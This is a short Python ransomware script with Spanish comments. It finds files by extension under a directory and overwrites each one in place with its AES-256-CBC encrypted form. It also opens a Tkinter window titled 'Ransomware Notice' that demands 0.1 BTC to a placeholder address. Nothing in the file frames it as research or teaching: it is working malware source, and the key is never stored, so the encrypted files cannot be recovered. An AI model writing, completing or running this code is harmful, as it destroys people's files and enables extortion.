import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import secrets
import tkinter as tk

def find_files(directory, extensions):
    """ Encuentra archivos en un directorio dado con ciertas extensiones """
    files_to_encrypt = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                files_to_encrypt.append(os.path.join(root, file))
    return files_to_encrypt

def encrypt_file(file_path, key):
    """ Encripta un archivo usando AES-256 y rellena los datos si es necesario """
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Agrega relleno a los datos
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = iv + encryptor.update(padded_data) + encryptor.finalize()
    
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

def display_ransom_message():
    """ Muestra un mensaje de rescate en una ventana emergente """
    root = tk.Tk()
    root.title("Ransomware Notice")
    tk.Label(root, text="Sus archivos han sido cifrados. Envíe 0.1 BTC a la dirección XYZ para recuperar sus archivos.", wraplength=400).pack()
    root.mainloop()
